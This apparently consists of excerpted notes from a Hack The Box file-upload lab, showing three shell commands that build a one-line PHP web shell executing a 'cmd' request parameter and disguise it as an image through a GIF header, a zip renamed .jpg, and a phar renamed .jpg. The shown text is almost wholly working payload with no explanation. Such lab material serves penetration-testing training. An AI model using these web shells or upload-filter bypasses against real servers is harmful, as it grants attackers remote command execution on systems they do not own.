...
```shell-session
xF1NN@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
...
```shell-session
xF1NN@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
...
```shell-session
xF1NN@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
